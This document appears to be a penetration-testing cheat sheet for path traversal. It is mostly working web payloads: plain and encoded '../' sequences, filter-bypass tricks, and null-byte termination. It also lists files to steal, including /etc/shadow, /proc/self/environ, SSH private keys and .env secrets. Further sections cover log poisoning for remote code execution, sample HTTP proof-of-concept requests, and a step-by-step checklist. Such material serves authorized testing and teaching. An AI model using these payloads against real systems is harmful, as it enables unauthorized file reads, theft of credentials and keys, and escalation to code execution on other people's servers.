Path Traversal
Path traversal (directory traversal) lets you read files outside the intended directory by injecting ../ sequences into file path parameters. The classic target is /etc/passwd  -  not because it's useful, but because it proves arbitrary file read. The real prizes are source code, config files with credentials, private keys, and application secrets.
Where to Find It
Any parameter that looks like it resolves to a file or path:
/download?file=report.pdf
/view?page=home
/assets?name=logo.png
/api/template?name=email_welcome
/export?format=csv&path=exports/report
/include?module=sidebar
Also headers: X-File-Name, custom headers in APIs, filename fields in multipart uploads.

Basic Payloads
../../../etc/passwd
../../etc/passwd
../etc/passwd
../../../../../etc/passwd   (go deep  -  cost is nothing)
On Windows targets:
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\windows\win.ini
../../../../../../windows/win.ini
Encoding Bypasses
When the app strips ../ literally, try encoded variants:
# URL encoding
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd   (double encoded  -  %25 decodes to %, giving %2f)
 
# Unicode / overlong UTF-8
..%c0%af..%c0%afetc%c0%afpasswd   (overlong encoding of /)
..%ef%bc%8f../etc/passwd           (fullwidth solidus U+FF0F)
 
# Mixed slashes (Windows)
..\/..\/etc\/passwd
..\/../etc/passwd
 
# Null byte (old PHP/C)
../../../etc/passwd%00.jpg
 
# Path normalization tricks
....//....//etc/passwd    (after stripping ../ becomes ../../)
....//...//.../etc/passwd
The ....// trick works when the filter strips ../ once without re-checking: ....// → strip ../ → ../ remains.
OS-Specific Targets
Linux / macOS
/etc/passwd                         -  users, proves traversal
/etc/shadow                         -  hashed passwords (needs root)
/etc/hosts                          -  network config
/proc/self/environ                  -  environment variables (secrets, keys)
/proc/self/cmdline                  -  process arguments
/proc/self/maps                     -  loaded libraries (helps with ASLR bypass)
/home/[user]/.ssh/id_rsa            -  private keys
/var/log/apache2/access.log         -  log injection → RCE via log poisoning
/var/www/html/config.php            -  app config
/app/config/database.yml            -  DB credentials (Rails)
/app/.env                           -  environment file with secrets
Windows
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config       -  IIS config, connection strings
C:\xampp\htdocs\config.php
C:\users\[user]\.ssh\id_rsa
Absolute Path Injection
Some apps accept absolute paths directly  -  no traversal needed:
/download?file=/etc/passwd
/view?path=C:\windows\win.ini
Always test absolute paths before spending time on relative traversal.
Determining Traversal Depth
You need to go back to the filesystem root. If the app is running from /var/www/html/downloads/, you need ../../../../etc/passwd (4 levels). But going too deep doesn't hurt  -  / followed by more ../ stays at /. I always start with 8 levels deep:
../../../../../../../../etc/passwd
If that works, binary search down to find the actual depth for cleanup in the PoC.
What to Read After Confirming Traversal
Once you have LFI, escalate the impact:

/proc/self/environ  -  may contain SECRET_KEY, DATABASE_URL, AWS_ACCESS_KEY_ID
App config files  -  .env, database.yml, config.php, appsettings.json
Web server config  -  nginx.conf, apache2/sites-enabled/*.conf (reveals other vhost paths)
SSH private keys  -  /home/deployer/.ssh/id_rsa
Source code  -  knowing the path from error messages or /proc/self/maps

For log poisoning → RCE: read the access log, inject a PHP payload into User-Agent or URL, then include the log file via LFI. This only works if the file is served through PHP include().
PoC
GET /download?file=../../../../etc/passwd HTTP/1.1
Host: target.com
Screenshot the response. If it shows /etc/passwd contents, that's your PoC. For higher impact, retrieve a secrets file:
GET /download?file=../../../app/.env HTTP/1.1
Checklist

 Find all parameters that accept filename/path input
 Test basic ../../../etc/passwd traversal
 Test absolute path injection: /etc/passwd directly
 If basic fails: try URL encoding, double encoding, ....// normalization bypass
 Test null byte termination on legacy apps
 After confirmation: read /proc/self/environ and app config files
 Look for private keys, API keys, DB credentials
 On Windows targets: test backslash variants and Windows-specific paths
